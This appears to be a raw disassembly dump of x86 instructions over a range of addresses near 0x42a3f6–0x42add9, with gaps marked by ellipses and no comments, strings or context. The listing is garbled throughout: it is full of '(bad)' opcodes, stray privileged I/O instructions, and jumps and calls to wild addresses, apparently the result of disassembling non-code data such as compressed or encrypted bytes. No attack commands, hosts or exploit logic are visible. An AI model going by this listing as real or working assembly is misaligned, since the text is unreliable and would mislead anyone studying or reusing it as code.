  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x1a29ad3d
  42a403:	pop    es
  42a404:	add    ah,0x1
  42a407:	add    BYTE PTR ds:0x73000001,al
  42a40d:	mov    ds:0x8a46c656,eax
  42a412:	xchg   esp,eax
  42a413:	int3   
  42a414:	rcl    BYTE PTR [edx-0x5],cl
  42a417:	mov    ch,0x44
  42a419:	push   edi
  42a41a:	cwde   
  42a41b:	sbb    ebx,edi
  42a41d:	mov    ds:0x7bb41793,eax
  42a422:	dec    edi
  42a423:	int3   
  42a424:	(bad)  
  42a427:	sbb    bh,BYTE PTR [edx+0x4b]
  42a42a:	and    ecx,ebp
  42a42c:	loop   0x42a451
  42a42e:	mov    ecx,0x65cf648e
  42a433:	mov    al,0x9d
  42a435:	es mov ecx,0x59b2dba
  42a43b:	je     0x42a4a5
  42a43d:	aam    0x99
  42a43f:	inc    esi
  42a440:	add    al,0xc2
  42a442:	adc    eax,0xc9108e2f
  42a447:	and    DWORD PTR [eax-0x38781678],edx
  42a44d:	shl    BYTE PTR [edx],0x59
  42a450:	push   edi
  42a451:	sub    BYTE PTR [edi+edi*4],bh
  42a454:	jmp    0xb95bcbbe
  42a459:	std    
  42a45a:	(bad)  
  42a45b:	sub    eax,0x8129b5a8
  42a460:	cmp    BYTE PTR [ebx-0x4e],0x8d
  42a464:	repnz sub al,0xa
  42a467:	mov    ebx,0xb4e70c60
  42a46c:	icebp  
  42a46d:	cmc    
  42a46e:	gs stc 
  42a470:	push   edi
  42a471:	out    dx,al
  42a472:	adc    eax,0x2b43de02
  42a477:	push   ebp
  42a478:	or     esi,ebp
  42a47a:	sbb    edx,DWORD PTR [eax]
  42a47c:	sbb    eax,0x6b5914db
  42a481:	pop    ds
  42a482:	rol    edi,0xe9
  42a485:	jns    0x42a437
  42a487:	sti    
  42a488:	mov    bh,0xb2
  42a48a:	rol    BYTE PTR [esi],cl
  42a48c:	idiv   DWORD PTR [edx+0x67c7c338]
  42a492:	push   edi
  42a493:	lahf   
  42a494:	aaa    
  42a495:	inc    ebp
  42a496:	scas   eax,DWORD PTR es:[edi]
  42a497:	call   0x9a96f602
  42a49c:	push   eax
  42a49d:	aad    0x4b
  42a49f:	jg     0x42a4a8
  42a4a1:	mov    cl,0xce
  42a4a3:	jmp    0x703b:0xb06ce62e
  42a4aa:	push   cs
  42a4ab:	ss outs dx,BYTE PTR ds:[esi]
  42a4ae:	ret    
  42a4af:	xor    ch,dh
  42a4b1:	sub    ebp,eax
  42a4b3:	std    
  42a4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a4b5:	push   ebx
  42a4b6:	adc    al,0x5d
  42a4b8:	test   BYTE PTR ds:0x107ed34e,0x3
  42a4bf:	aaa    
  42a4c0:	dec    edx
  42a4c1:	gs or  al,0xdc
  42a4c4:	bound  ecx,QWORD PTR [eax]
  42a4c6:	mov    cs,WORD PTR [edx*2+0x41fbaa56]
  42a4cd:	iret   
  42a4ce:	fdivr  st,st(5)
  42a4d0:	test   al,0x57
  42a4d2:	cmp    al,0xb5
  42a4d4:	inc    ecx
  42a4d5:	inc    edx
  42a4d6:	jge    0x42a4bf
  42a4d8:	or     eax,0xdb4200c8
  42a4dd:	xchg   esi,eax
  42a4de:	ret    0xdf98
  42a4e1:	add    eax,0x112317b4
  42a4e6:	sahf   
  42a4e7:	call   0x2fd54eca
  42a4ec:	in     eax,0x7e
  42a4ee:	and    DWORD PTR [esi],ebx
  42a4f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a4f1:	inc    edx
  42a4f2:	cdq    
  42a4f3:	lahf   
  42a4f4:	ds std 
  42a4f6:	aas    
  42a4f7:	lock (bad) 
  42a4f9:	bound  eax,QWORD PTR [eax-0x422de866]
  42a4ff:	outs   dx,BYTE PTR ds:[esi]
  42a500:	stos   DWORD PTR es:[edi],eax
  42a501:	add    DWORD PTR ds:0xc07f1fb1,0xffffff97
  42a508:	aam    0x72
  42a50a:	dec    ebp
  42a50b:	enter  0x741e,0x2e
  42a50f:	call   0x42a5d2
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xad7d5c9f
  42a583:	pop    edi
  42a584:	xchg   ebp,eax
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    eax,0xfe000001
  42a58d:	sbb    bl,bl
  42a58f:	out    dx,eax
  42a590:	adc    eax,esp
  42a592:	clc    
  42a593:	in     eax,0x9e
  42a595:	int    0x1c
  42a597:	push   esp
  42a598:	pop    es
  42a599:	jp     0x42a5fc
  42a59b:	sti    
  42a59c:	cmp    al,dl
  42a59e:	inc    ebx
  42a59f:	xor    cl,dh
  42a5a1:	das    
  42a5a2:	arpl   WORD PTR [ebx+0x6b58be31],bp
  42a5a8:	jge    0x42a5f1
  42a5aa:	fnstenv [edi+0x54c09a04]
  42a5b0:	es xchg esp,eax
  42a5b2:	push   edi
  42a5b3:	add    DWORD PTR [edx+eax*4+0x11],eax
  42a5b7:	mov    dh,0xeb
  42a5b9:	shl    BYTE PTR [ebx-0x3170a242],cl
  42a5bf:	xchg   esp,eax
  42a5c0:	in     eax,0x32
  42a5c2:	fisubr WORD PTR [edx+0x2dad0755]
  42a5c8:	sbb    al,0x4
  42a5ca:	test   al,0x91
  42a5cc:	jecxz  0x42a645
  42a5ce:	sub    eax,0x64dc9e32
  42a5d3:	xchg   ebx,eax
  42a5d4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5d6:	jg     0x42a5ba
  42a5d8:	mov    edi,0x620c66c3
  42a5dd:	sbb    DWORD PTR [ecx],0x1d
  42a5e0:	retf   0x2fc3
  42a5e3:	stc    
  42a5e4:	(bad)  
  42a5e5:	pop    edx
  42a5e6:	jle    0x42a574
  42a5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a5e9:	in     eax,dx
  42a5ea:	ss lahf 
  42a5ec:	add    ch,ch
  42a5ee:	out    0x3a,eax
  42a5f0:	mov    fs,WORD PTR [ebx]
  42a5f2:	mov    ecx,DWORD PTR [ebx+0xc]
  42a5f5:	sub    eax,0x72ac4fc4
  42a5fa:	dec    edi
  42a5fb:	mov    cl,0x9
  42a5fd:	lods   al,BYTE PTR ds:[esi]
  42a5fe:	sbb    BYTE PTR [ebx],0x5a
  42a601:	ins    DWORD PTR es:[edi],dx
  42a602:	rol    BYTE PTR [esi-0x7a],cl
  42a605:	lea    ebp,[eax-0x67]
  42a608:	mov    al,0x97
  42a60a:	stos   DWORD PTR es:[edi],eax
  42a60b:	pop    edx
  42a60c:	or     DWORD PTR [ebx],ecx
  42a60e:	int3   
  42a60f:	fnstsw WORD PTR [ecx-0x2a]
  42a612:	add    eax,0xcc4c6160
  42a617:	and    dh,BYTE PTR ds:0xd17f99dd
  42a61d:	sbb    DWORD PTR gs:[ecx-0x3],ebp
  42a621:	aam    0xca
  42a623:	sbb    DWORD PTR [eax-0x74],eax
  42a626:	mov    esp,0x6029324b
  42a62b:	push   0xfffffff4
  42a62d:	mov    ?,ecx
  42a62f:	mov    ecx,0x8b7a1efe
  42a634:	jae    0x42a693
  42a636:	dec    edi
  42a637:	arpl   dx,cx
  42a639:	add    DWORD PTR [edx+0x2ac5871b],ebp
  42a63f:	mov    al,0xab
  42a641:	pop    eax
  42a642:	or     BYTE PTR [eax-0x59036177],dl
  42a648:	inc    esp
  42a649:	mov    al,0xc0
  42a64b:	prefetch BYTE PTR [edx-0x11b4cdb5]
  42a652:	shr    BYTE PTR [esi-0x47e783e2],0x81
  42a659:	adc    cl,BYTE PTR [esi-0x33]
  42a65c:	mov    ds:0xcbe85450,eax
  42a661:	out    dx,eax
  42a662:	inc    ecx
  42a663:	push   ds
  42a664:	inc    ecx
  42a665:	and    DWORD PTR [eax+0x9a4b34a],ebx
  42a66b:	(bad)  
  42a66c:	stos   DWORD PTR es:[edi],eax
  42a66d:	cdq    
  42a66e:	mov    dl,0x2c
  42a670:	mov    cl,0x92
  42a672:	jl     0x42a683
  42a674:	and    DWORD PTR [esi],0x29
  42a677:	xchg   ebp,eax
  42a678:	imul   esi,DWORD PTR [ecx+ebx*4+0x1d],0x348aa304
  42a680:	div    edi
  42a682:	daa    
  42a683:	mov    edx,ss
  42a685:	dec    DWORD PTR [ebp-0x6f56cf7e]
  42a68b:	pop    ss
  42a68c:	mov    bl,0xc9
  42a68e:	dec    ecx
  42a68f:	mov    dh,0xf2
	...
  42a6f1:	add    BYTE PTR [eax],al
  42a6f3:	add    BYTE PTR [esi+edx*1],ah
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x1f47ece4],0x8cc1c164
  42a705:	mov    BYTE PTR [ecx],0x0
  42a708:	add    eax,0xcc000001
  42a70d:	pop    ecx
  42a70e:	idiv   bh
  42a710:	mov    bh,dl
  42a712:	sbb    al,0x32
  42a714:	mov    BYTE PTR [edi-0x21b2a11c],al
  42a71a:	mov    al,ds:0x65d7692d
  42a71f:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a721:	js     0x42a6e5
  42a723:	mov    ebx,0x66eae78d
  42a728:	retf   
  42a729:	inc    ecx
  42a72a:	push   ebp
  42a72b:	jmp    0x5839:0x39042d95
  42a732:	out    dx,al
  42a733:	stos   BYTE PTR es:[edi],al
  42a734:	ror    DWORD PTR [esi],1
  42a736:	int3   
  42a737:	pushf  
  42a738:	inc    edx
  42a739:	add    al,0x23
  42a73b:	push   0x4b7e9b9c
  42a740:	inc    ebx
  42a741:	inc    ebx
  42a742:	push   ecx
  42a743:	(bad)  
  42a744:	pop    ecx
  42a745:	sub    BYTE PTR [ebx-0x7d725236],dh
  42a74b:	adc    BYTE PTR [ecx-0x1af3d62f],ch
  42a751:	(bad)  
  42a752:	add    eax,0xd5e88dac
  42a757:	inc    ebp
  42a758:	repnz sar BYTE PTR [ebx-0x7c274df7],cl
  42a75f:	mov    dl,al
  42a761:	xor    esp,edx
  42a763:	sub    al,0x6b
  42a765:	and    ah,bl
  42a767:	jecxz  0x42a7d4
  42a769:	dec    eax
  42a76a:	stc    
  42a76b:	bound  ebx,QWORD PTR [eax]
  42a76d:	std    
  42a76e:	jnp    0x42a771
  42a770:	in     al,dx
  42a771:	or     DWORD PTR ds:0xec748d4,edx
  42a777:	push   ds
  42a778:	arpl   ax,bx
  42a77a:	jge    0x42a755
  42a77c:	punpcklwd mm0,DWORD PTR [ebp+0xd]
  42a780:	ror    BYTE PTR [esi+ebx*2+0x144dcd10],1
  42a787:	clc    
  42a788:	and    eax,0x8cda3f31
  42a78d:	xor    al,0x42
  42a78f:	cld    
  42a790:	sub    ah,BYTE PTR [edx-0x43]
  42a793:	rcr    BYTE PTR [esi],cl
  42a795:	mov    edi,0x7e7919ce
  42a79a:	scas   eax,DWORD PTR es:[edi]
  42a79b:	test   al,0xac
  42a79d:	jp     0x42a77e
  42a79f:	adc    ebx,edi
  42a7a1:	fs ins BYTE PTR es:[edi],dx
  42a7a3:	push   ecx
  42a7a4:	fs in  al,0xfb
  42a7a7:	mov    ?,ebp
  42a7a9:	in     al,dx
  42a7aa:	push   ebx
  42a7ab:	out    0x1d,eax
  42a7ad:	(bad)  
  42a7ae:	ins    DWORD PTR es:[edi],dx
  42a7af:	pushf  
  42a7b0:	push   edx
  42a7b1:	aam    0xbb
  42a7b3:	cmp    al,0x91
  42a7b5:	repnz fild WORD PTR [edi]
  42a7b8:	lods   al,BYTE PTR ds:[esi]
  42a7b9:	(bad)  
  42a7ba:	stos   BYTE PTR es:[edi],al
  42a7bb:	loope  0x42a81e
  42a7bd:	mov    ecx,0xcfbc465d
  42a7c2:	dec    ecx
  42a7c3:	(bad)  [edx+0x25681645]
  42a7c9:	pop    es
  42a7ca:	sub    dh,BYTE PTR [ebp-0x5a]
  42a7cd:	jnp    0x42a81d
  42a7cf:	mov    bh,0xc8
  42a7d1:	mov    WORD PTR [esi-0x4b3a1bed],gs
  42a7d7:	push   edi
  42a7d8:	and    esp,DWORD PTR [edx-0x57f5274a]
  42a7de:	repz push 0x53
  42a7e1:	mov    esp,edx
  42a7e3:	mov    bl,0xde
  42a7e5:	mov    edx,0x1b3085a8
  42a7ea:	stc    
  42a7eb:	add    DWORD PTR [ebp+0xbe11765],0x7e
  42a7f2:	in     al,0x1c
  42a7f4:	jmp    0x884f5d9b
  42a7f9:	xor    al,0xc8
  42a7fb:	call   0x4fcb6df9
  42a800:	loope  0x42a87a
  42a802:	stos   DWORD PTR es:[edi],eax
  42a803:	or     DWORD PTR [esi-0x98752ab],ebp
  42a809:	jecxz  0x42a7c7
  42a80b:	imul   ecx,esi,0x497620c8
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	jmp    0x922f8403
  42a885:	mov    DWORD PTR [ecx],0x10500
  42a88b:	add    BYTE PTR [esi-0x74],dh
  42a88e:	fldcw  WORD PTR [edx-0xf624e64]
  42a894:	call   DWORD PTR [ebx]
  42a896:	cmp    DWORD PTR [ecx],esp
  42a898:	mov    esi,0x5c509027
  42a89d:	retf   
  42a89e:	rol    BYTE PTR [eax+0xa94a3eb],0xcc
  42a8a5:	jmp    0x42a87f
  42a8a7:	mov    WORD PTR [esi+eax*8-0x11],es
  42a8ab:	(bad)  
  42a8ac:	sbb    ah,cl
  42a8ae:	sbb    al,0x3c
  42a8b0:	fadd   QWORD PTR [ebx]
  42a8b2:	sbb    al,0x1
  42a8b4:	std    
  42a8b5:	dec    ebp
  42a8b6:	(bad)  
  42a8b7:	mov    ebx,0xc40c9015
  42a8bc:	pop    edx
  42a8bd:	inc    ebp
  42a8be:	jae    0x42a87e
  42a8c0:	push   eax
  42a8c1:	inc    ecx
  42a8c2:	in     eax,dx
  42a8c3:	clc    
  42a8c4:	xchg   ebp,eax
  42a8c5:	out    0x9d,eax
  42a8c7:	int    0xa5
  42a8c9:	dec    ecx
  42a8ca:	call   0x376e98aa
  42a8cf:	jle    0x42a950
  42a8d1:	xlat   BYTE PTR ds:[ebx]
  42a8d2:	bnd jg 0x42a8da
  42a8d5:	cld    
  42a8d6:	in     eax,0xf3
  42a8d8:	stos   DWORD PTR es:[edi],eax
  42a8d9:	sub    BYTE PTR [ebp+0x1b],ah
  42a8dc:	shl    DWORD PTR [ecx-0x2e14bc7c],0xd8
  42a8e3:	in     eax,0x99
  42a8e5:	test   DWORD PTR [ebp-0x3eb1f8f3],esp
  42a8eb:	jno    0x678c089
  42a8f1:	out    dx,al
  42a8f2:	or     cl,bh
  42a8f4:	adc    cl,ch
  42a8f6:	test   DWORD PTR [eax+0x32],0xe1606687
  42a8fd:	and    DWORD PTR [ecx+ebx*8],ecx
  42a900:	xchg   ch,ah
  42a902:	add    al,bl
  42a904:	es lock ret 
  42a907:	xchg   esp,eax
  42a908:	sub    edx,edx
  42a90a:	mov    bh,0xba
  42a90c:	push   0xfffffff8
  42a90e:	popa   
  42a90f:	mov    ecx,0x20b694d0
  42a914:	cmc    
  42a915:	inc    edx
  42a916:	lods   al,BYTE PTR ds:[esi]
  42a917:	loopne 0x42a914
  42a919:	or     ebp,DWORD PTR [ecx]
  42a91b:	push   0x91ee4027
  42a920:	dec    ebp
  42a921:	sub    BYTE PTR [edx],dl
  42a923:	xchg   ebp,eax
  42a924:	out    dx,al
  42a925:	mov    ah,0xf1
  42a927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a928:	out    0xfd,eax
  42a92a:	push   ss
  42a92b:	adc    al,0x5e
  42a92d:	inc    edi
  42a92e:	inc    DWORD PTR [ebp+0xe]
  42a931:	mov    eax,ds:0xb87eec47
  42a936:	push   edx
  42a937:	adc    dh,BYTE PTR ds:[ecx-0x42]
  42a93b:	pop    esp
  42a93c:	repnz or al,0x37
  42a93f:	shr    BYTE PTR [esi-0x390c7f4f],0x4c
  42a946:	les    edi,FWORD PTR [ebp+0x3b293274]
  42a94c:	jns    0x42a98f
  42a94e:	arpl   WORD PTR [edx],di
  42a950:	lahf   
  42a951:	icebp  
  42a952:	push   ebp
  42a953:	call   0xdde8:0x4dec9e1a
  42a95a:	stc    
  42a95b:	or     eax,0xf595686a
  42a960:	stos   DWORD PTR es:[edi],eax
  42a961:	fistp  QWORD PTR [eax-0x71adf3d6]
  42a967:	test   ch,bl
  42a969:	mov    dl,0x37
  42a96b:	push   edi
  42a96c:	mov    al,ds:0x403c81ca
  42a971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a972:	mov    bl,0xa1
  42a974:	sti    
  42a975:	cmp    eax,0x7d3ecf7
  42a97a:	mov    cl,0x45
  42a97c:	xchg   ecx,eax
  42a97d:	nop
  42a97e:	inc    edx
  42a97f:	or     DWORD PTR [ecx],eax
  42a981:	xchg   ebx,eax
  42a982:	and    al,0x36
  42a984:	ret    
  42a985:	sub    BYTE PTR ds:0x60817b53,al
  42a98b:	jle    0x42a9a7
  42a98d:	mov    esi,edx
  42a98f:	int    0x8d
	...
  42a9f1:	add    BYTE PTR [eax],al
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	inc    edi
  42aa01:	rcl    BYTE PTR [ecx+0x1c89638],1
  42aa07:	add    BYTE PTR ds:0xad000001,al
  42aa0d:	mov    edx,0xea884a5c
  42aa12:	(bad)  
  42aa13:	loopne 0x42a9f1
  42aa15:	jmp    0xf9be:0x137db653
  42aa1c:	sbb    eax,0x90d7e582
  42aa21:	in     al,0xc5
  42aa23:	add    eax,0x20622c1e
  42aa28:	push   cs
  42aa29:	fwait
  42aa2a:	jecxz  0x42aa0f
  42aa2c:	ja     0x42aa57
  42aa2e:	pop    ebp
  42aa2f:	dec    ecx
  42aa30:	adc    DWORD PTR [ecx+ecx*8+0x20767501],eax
  42aa37:	push   0xb2ac93aa
  42aa3c:	fs or  eax,0x736fff59
  42aa42:	sbb    bh,BYTE PTR [ebx+ebp*4-0x1e]
  42aa46:	xchg   esp,eax
  42aa47:	xchg   edx,eax
  42aa48:	inc    edi
  42aa49:	and    ch,BYTE PTR [ebp-0x6]
  42aa4c:	repnz test eax,0xa1cca6ac
  42aa52:	mov    edi,0x8ea0b015
  42aa57:	je     0x42a9e4
  42aa59:	sti    
  42aa5a:	retf   
  42aa5b:	div    cl
  42aa5d:	test   DWORD PTR ds:0x3fde2099,ebp
  42aa63:	and    BYTE PTR es:[eax-0x16a13f87],dh
  42aa6a:	ror    DWORD PTR es:[ecx-0x69],1
  42aa6e:	jmp    0xec5f:0x99d1b4a5
  42aa75:	test   DWORD PTR [edx],esp
  42aa77:	xchg   esi,eax
  42aa78:	js     0x42aaa7
  42aa7a:	fwait
  42aa7b:	mov    DWORD PTR [edi],ebx
  42aa7d:	je     0x42aa38
  42aa7f:	sub    DWORD PTR [ecx],0xe317e84c
  42aa85:	enter  0xfbe0,0x1c
  42aa89:	shl    DWORD PTR [edi+0x4a15c987],1
  42aa8f:	xchg   edi,eax
  42aa90:	in     al,0x6a
  42aa92:	gs jle 0x42aa37
  42aa95:	add    BYTE PTR [ecx-0x58dd36c6],dl
  42aa9b:	mov    al,0xe2
  42aa9d:	data16 fdivr DWORD PTR [edx+0x25]
  42aaa1:	fadd   DWORD PTR [ebp+ebp*8-0x4c]
  42aaa5:	mov    ch,0x6e
  42aaa7:	adc    edi,DWORD PTR [eax-0x9ae555e]
  42aaad:	xchg   esp,eax
  42aaae:	movd   mm3,DWORD PTR [ebp+0x3df0936c]
  42aab5:	inc    esi
  42aab6:	arpl   WORD PTR [ecx],ax
  42aab8:	bound  esi,QWORD PTR ds:0xa56b6e25
  42aabe:	es addr16 mov bh,0x6e
  42aac2:	add    ebp,DWORD PTR ds:0x9ac4989d
  42aac8:	push   cs
  42aac9:	mov    ss:0xe2325d0c,al
  42aacf:	sub    ecx,DWORD PTR [esi]
  42aad1:	xor    al,cl
  42aad3:	inc    ebx
  42aad4:	retf   
  42aad5:	mov    ds:0xdb76bc77,al
  42aada:	leave  
  42aadb:	pop    esp
  42aadc:	xor    edi,esi
  42aade:	not    DWORD PTR [ebp+eiz*8-0x1e]
  42aae2:	jle    0x42ab24
  42aae4:	sbb    DWORD PTR [esi],ebp
  42aae6:	shl    BYTE PTR [ecx-0x2dd2bc94],cl
  42aaec:	and    al,BYTE PTR [ecx-0x358f0ef7]
  42aaf2:	or     dh,BYTE PTR [esi+0x4cdfe054]
  42aaf8:	sbb    DWORD PTR [esi+eax*2+0x35c955a4],0x3b4d126e
  42ab03:	mov    WORD PTR [ecx+0x2760a6ef],?
  42ab09:	pxor   mm6,QWORD PTR [ecx]
  42ab0c:	pop    eax
  42ab0d:	sbb    dh,ch
  42ab0f:	mov    cl,0x14
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	cli    
  42ab81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab82:	xor    eax,0x1c99b11
  42ab87:	add    BYTE PTR ds:0x27000001,al
  42ab8d:	push   edx
  42ab8e:	ins    DWORD PTR es:[edi],dx
  42ab8f:	data16 mov bl,0xed
  42ab92:	xchg   edx,eax
  42ab93:	neg    BYTE PTR [edx+0xc7fd92b]
  42ab99:	xor    eax,0x3fbb6f14
  42ab9e:	lock pop es
  42aba0:	std    
  42aba1:	xchg   ecx,eax
  42aba2:	cmp    ch,al
  42aba4:	stos   DWORD PTR es:[edi],eax
  42aba5:	mov    bl,0x6b
  42aba7:	les    ebp,FWORD PTR [edx-0x750cb360]
  42abad:	xor    al,BYTE PTR [ebp+ecx*4-0x2e338102]
  42abb4:	nop
  42abb5:	pop    edx
  42abb6:	or     bh,BYTE PTR [ebp+edx*1+0x32ca9e72]
  42abbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abbe:	push   edx
  42abbf:	and    edi,DWORD PTR [ebp+eax*1-0x7c]
  42abc3:	imul   eax,DWORD PTR [eax+ebx*1],0x7
  42abc7:	jle    0x42abcc
  42abc9:	bound  eax,QWORD PTR [ebx-0x239721d0]
  42abcf:	scas   al,BYTE PTR es:[edi]
  42abd0:	jns    0x42abd1
  42abd2:	lock push edx
  42abd4:	mov    bl,0x1d
  42abd6:	es imul ebx,DWORD PTR ds:[eax*1+0x1962f190],0x17
  42abe0:	or     esi,DWORD PTR [edx+eax*1-0x5b]
  42abe4:	adc    DWORD PTR [eax],0xffffffca
  42abe7:	sub    bh,ch
  42abe9:	jae    0x42ab85
  42abeb:	cmc    
  42abec:	loope  0x42ac5a
  42abee:	ror    DWORD PTR [eax],0xef
  42abf1:	pop    esp
  42abf2:	inc    esp
  42abf3:	neg    BYTE PTR [edx+eiz*1+0x311a6251]
  42abfa:	mov    bh,0xb5
  42abfc:	xlat   BYTE PTR ds:[ebx]
  42abfd:	pop    ss
  42abfe:	in     eax,dx
  42abff:	pusha  
  42ac00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac01:	pop    ecx
  42ac02:	popf   
  42ac03:	gs push edi
  42ac05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac06:	mov    esi,0x4871ae3
  42ac0b:	mov    al,ds:0x1e4767e3
  42ac10:	xor    BYTE PTR [eax+ebp*1+0x7d31f87a],cl
  42ac17:	mov    edx,0x8650ddb5
  42ac1c:	ror    al,0xf7
  42ac1f:	fimul  WORD PTR [edi+0x7]
  42ac22:	adc    al,0x74
  42ac24:	ss pop ds
  42ac26:	inc    ecx
  42ac27:	xlat   BYTE PTR ds:[ebx]
  42ac28:	fisubr DWORD PTR [ebx+0x738bcc3a]
  42ac2e:	adc    dl,BYTE PTR [ebx]
  42ac30:	(bad)  
  42ac31:	adc    edi,DWORD PTR [esi+0x87bf33a]
  42ac37:	or     DWORD PTR [ebp+0x3601abf3],edx
  42ac3d:	retf   
  42ac3e:	ins    BYTE PTR es:[edi],dx
  42ac3f:	les    esp,FWORD PTR [edi+0x53]
  42ac42:	icebp  
  42ac43:	jp     0x42ac89
  42ac45:	inc    edx
  42ac46:	(bad)  
  42ac47:	xlat   BYTE PTR ds:[ebx]
  42ac48:	jge    0x42ac16
  42ac4a:	jl     0x42abe3
  42ac4c:	pop    ds
  42ac4d:	pop    esp
  42ac4e:	cmp    dl,bl
  42ac50:	xor    eax,0xcbbcbefa
  42ac55:	sub    DWORD PTR [esi],ebp
  42ac57:	ins    BYTE PTR es:[edi],dx
  42ac58:	test   al,0xf2
  42ac5a:	add    dl,dh
  42ac5c:	(bad)  
  42ac5d:	fsubr  st,st(1)
  42ac5f:	dec    eax
  42ac60:	pop    ebx
  42ac61:	jge    0x42acc0
  42ac63:	ds into 
  42ac65:	enter  0xf8c6,0xd
  42ac69:	cmc    
  42ac6a:	test   al,0xb4
  42ac6c:	sub    DWORD PTR [ebx+0x3f],esi
  42ac6f:	in     al,dx
  42ac70:	(bad)  
  42ac71:	or     dl,BYTE PTR [edi]
  42ac73:	lahf   
  42ac74:	pop    es
  42ac75:	inc    esi
  42ac76:	mov    ds:0x918dcf00,al
  42ac7b:	and    ch,BYTE PTR [eax-0x44]
  42ac7e:	fild   WORD PTR [edx-0x380bea64]
  42ac84:	fcom   QWORD PTR [edi+0x151a1c7d]
  42ac8b:	cmp    DWORD PTR [edx],ebx
  42ac8d:	repz mov ds:0x2a0b,al
	...
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	call   0xa0cfca11
  42ad05:	retf   0x1
  42ad08:	add    eax,0xdb000001
  42ad0d:	push   edx
  42ad0e:	(bad)  [ebx+0x2f049e86]
  42ad14:	iret   
  42ad15:	jbe    0x42ad37
  42ad17:	ds mov dh,0x66
  42ad1a:	dec    esi
  42ad1b:	test   al,0xf6
  42ad1d:	es (bad) 
  42ad1f:	or     ebx,DWORD PTR [ecx+eax*8]
  42ad22:	jnp    0x42ad97
  42ad24:	mov    es,WORD PTR [ebp+0x71b2de74]
  42ad2a:	fcomp  QWORD PTR [eax]
  42ad2c:	pop    ss
  42ad2d:	sbb    al,0x6e
  42ad2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad30:	mov    ebx,0x1d6500f2
  42ad35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad36:	sub    BYTE PTR [edx-0x190dac7e],0x62
  42ad3d:	js     0x42ad14
  42ad3f:	inc    eax
  42ad40:	and    al,0x1b
  42ad42:	test   DWORD PTR [edi+ecx*1-0x11594a31],eax
  42ad49:	retf   0x2f42
  42ad4c:	dec    esp
  42ad4d:	bound  ecx,QWORD PTR [ecx+0x5b]
  42ad50:	jle    0x42acfc
  42ad52:	mul    BYTE PTR [ecx+0x305d7d76]
  42ad58:	jp     0x42ad7e
  42ad5a:	mov    DWORD PTR [edx+0x54],ebp
  42ad5d:	mov    dl,0x72
  42ad5f:	xor    DWORD PTR ds:[edi+0x64],edx
  42ad63:	or     edi,DWORD PTR [edx]
  42ad65:	outs   dx,DWORD PTR ds:[esi]
  42ad66:	inc    bp
  42ad68:	dec    ebp
  42ad69:	push   ds
  42ad6a:	mov    ds:0x851fe726,eax
  42ad6f:	or     eax,0xdfaae1d9
  42ad74:	xchg   esp,eax
  42ad75:	pop    edi
  42ad76:	cwde   
  42ad77:	pop    edx
  42ad78:	add    al,0xc6
  42ad7a:	ficom  DWORD PTR [edi+0x2562ea08]
  42ad80:	sub    eax,0x35fc4049
  42ad85:	adc    DWORD PTR [ecx-0x5f081c4a],0x8643ed5f
  42ad8f:	fst    DWORD PTR [edi]
  42ad91:	(bad)  
  42ad92:	push   esi
  42ad93:	cmp    BYTE PTR [ecx],ch
  42ad95:	mov    dh,0x1a
  42ad97:	or     bh,0x0
  42ad9a:	inc    ebp
  42ad9b:	inc    eax
  42ad9c:	inc    ebp
  42ad9d:	mov    ebp,0x9ec5f287
  42ada2:	loope  0x42add5
  42ada4:	aam    0xb6
  42ada6:	inc    eax
  42ada7:	ret    
  42ada8:	push   edi
  42ada9:	sub    al,0x20
  42adab:	jmp    0x42ae06
  42adad:	jg     0x42ae25
  42adaf:	out    dx,al
  42adb0:	test   eax,0x4e458598
  42adb5:	jo     0x42adda
  42adb7:	pop    ds
  42adb8:	mov    edx,0xee84fab8
  42adbd:	xchg   ecx,eax
  42adbe:	sbb    ah,BYTE PTR [esp+edi*2+0x24]
  42adc2:	mov    ecx,0x3fc8a32d
  42adc7:	sti    
  42adc8:	sub    ah,ch
  42adca:	and    al,0x9e
  42adcc:	inc    ebx
  42adcd:	daa    
  42adce:	push   0xffffffad
  42add0:	popa   
  42add1:	fmul   QWORD PTR [esp+esi*2-0x73]
  42add5:	in     al,0x46
  42add7:	test   BYTE PTR [ecx],ch
  42add9:	mov    bl,0x2f
